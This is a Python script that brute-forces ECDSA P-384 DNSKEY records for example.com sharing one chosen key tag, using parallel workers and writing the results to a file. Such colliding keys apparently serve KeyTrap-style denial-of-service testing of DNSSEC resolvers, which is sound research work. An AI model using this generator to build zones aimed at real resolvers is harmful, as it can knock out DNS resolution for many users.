# generate_colliding_keys_to_file.py

import base64
import struct
import os
import time
import argparse
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization
from multiprocessing import Pool, cpu_count, Lock, Manager

# --- Default configuration ---
DEFAULT_TARGET_KEY_TAG = 18503
DEFAULT_TOTAL_KEYS = 500
DEFAULT_OUTPUT_FILE = "colliding_keys.txt"
DEFAULT_FLAGS = 256
DEFAULT_PROTOCOL = 3
DEFAULT_ALGORITHM = 14

# --- DNSKEY parameters (will be overridden by command line arguments) ---
FLAGS = DEFAULT_FLAGS
PROTOCOL = DEFAULT_PROTOCOL
ALGORITHM = DEFAULT_ALGORITHM

def calculate_key_tag(public_key_b64):
    """Calculate the Key Tag of a DNSKEY according to RFC 4034, Appendix B."""
    public_key_bytes = base64.b64decode(public_key_b64)
    rdata = struct.pack('!HBB', FLAGS, PROTOCOL, ALGORITHM) + public_key_bytes

    acc = 0
    for i, byte in enumerate(rdata):
        if i & 1:
            acc += byte
        else:
            acc += (byte << 8)
    
    acc = (acc & 0xFFFF) + (acc >> 16)
    return (acc & 0xFFFF)

def worker_task(args):
    """
    Worker process task. It will keep running until all required keys are found.
    """
    file_lock, found_keys_count, target_key_tag, total_keys, output_file = args
    pid = os.getpid()
    print(f"[Worker PID: {pid}] Starting search...")
    keys_generated = 0
    start_time = time.time()

    while found_keys_count.value < total_keys:
        # 1. Generate key pair
        private_key = ec.generate_private_key(ec.SECP384R1())
        public_key = private_key.public_key()
        
        # 2. Get public key bytes
        public_key_bytes = public_key.public_bytes(
            encoding=serialization.Encoding.X962,
            format=serialization.PublicFormat.UncompressedPoint
        )[1:]
        public_key_b64 = base64.b64encode(public_key_bytes).decode('utf-8')
        
        # 3. Calculate Key Tag
        key_tag = calculate_key_tag(public_key_b64)
        keys_generated += 1

        # 4. Check if it matches
        if key_tag == target_key_tag:
            # Acquire lock to ensure atomicity of file writes
            with file_lock:
                # Re-check whether enough keys have already been found (other processes may have completed while waiting for the lock)
                if found_keys_count.value < total_keys:
                    dnskey_record = f"example.com. IN DNSKEY {FLAGS} {PROTOCOL} {ALGORITHM} {public_key_b64}\n"

                    # Write to file
                    with open(output_file, "a") as f:
                        f.write(dnskey_record)

                    # Update shared counter
                    found_keys_count.value += 1

                    kps = keys_generated / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
                    print(f"\n[Worker PID: {pid}] Found key {found_keys_count.value}/{total_keys}! (Speed: {kps:.2f} kps)")

        # Print progress, avoid flooding the screen too quickly
        if keys_generated % 50000 == 0:
            kps = keys_generated / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
            print(f"[Worker PID: {pid}] Tried {keys_generated} keys... (Overall progress: {found_keys_count.value}/{total_keys}) (Speed: {kps:.2f} kps)", end='\r')

    # print(f"[Worker PID: {pid}] Task completed, exiting.")

def get_existing_key_count(filename):
    """Check the file and return the number of existing keys"""
    if not os.path.exists(filename):
        return 0
    with open(filename, "r") as f:
        lines = f.readlines()
        return len(lines)

def parse_args():
    parser = argparse.ArgumentParser(description='Generate colliding keys with a specified Key Tag')
    parser.add_argument('-t', '--target-key-tag', type=int, default=DEFAULT_TARGET_KEY_TAG,
                        help=f'Target Key Tag (default: {DEFAULT_TARGET_KEY_TAG})')
    parser.add_argument('-n', '--total-keys', type=int, default=DEFAULT_TOTAL_KEYS,
                        help=f'Number of keys to find (default: {DEFAULT_TOTAL_KEYS})')
    parser.add_argument('-o', '--output', type=str, default=DEFAULT_OUTPUT_FILE,
                        help=f'Output file name (default: {DEFAULT_OUTPUT_FILE})')
    parser.add_argument('-f', '--flags', type=int, default=DEFAULT_FLAGS,
                        help=f'DNSKEY Flags (default: {DEFAULT_FLAGS})')
    parser.add_argument('-p', '--protocol', type=int, default=DEFAULT_PROTOCOL,
                        help=f'DNSKEY Protocol (default: {DEFAULT_PROTOCOL})')
    parser.add_argument('-a', '--algorithm', type=int, default=DEFAULT_ALGORITHM,
                        help=f'DNSKEY Algorithm (default: {DEFAULT_ALGORITHM})')
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()

    # Update global variables
    FLAGS = args.flags
    PROTOCOL = args.protocol
    ALGORITHM = args.algorithm

    target_key_tag = args.target_key_tag
    total_keys = args.total_keys
    output_file = args.output

    # Use Manager to create inter-process shared objects
    with Manager() as manager:
        # Create a lock
        file_lock = manager.Lock()

        # Check existing key count
        initial_count = get_existing_key_count(output_file)
        if initial_count >= total_keys:
            print(f"[*] File '{output_file}' already contains {initial_count} keys, which satisfies the target of {total_keys}.")
            print("[*] No need to run.")
            exit()

        if initial_count > 0:
            print(f"[*] Detected {initial_count} existing keys in file '{output_file}'.")

        # Create a shared counter value
        found_keys_count = manager.Value('i', initial_count)

        num_workers = cpu_count() // 4  # Use one quarter of CPU cores as the number of worker processes
        print(f"[*] Using {num_workers} CPU cores for parallel computation.")
        print(f"[*] Target Key Tag: {target_key_tag}")
        print(f"[*] Target: find {total_keys} keys. Currently have {found_keys_count.value}.")

        # Create process pool
        with Pool(processes=num_workers) as pool:
            # Distribute tasks to all worker processes
            # Each process will check the shared counter to decide whether to continue working
            worker_args = (file_lock, found_keys_count, target_key_tag, total_keys, output_file)
            tasks = [pool.apply_async(worker_task, (worker_args,)) for _ in range(num_workers)]

            # Wait for all tasks to complete
            for task in tasks:
                try:
                    task.get()
                except Exception as e:
                    print(f"A worker process encountered an error: {e}")

    print("\n\n" + "="*50)
    print(f"[+] Task completed! All {total_keys} keys have been written to file '{output_file}'.")
    print("="*50)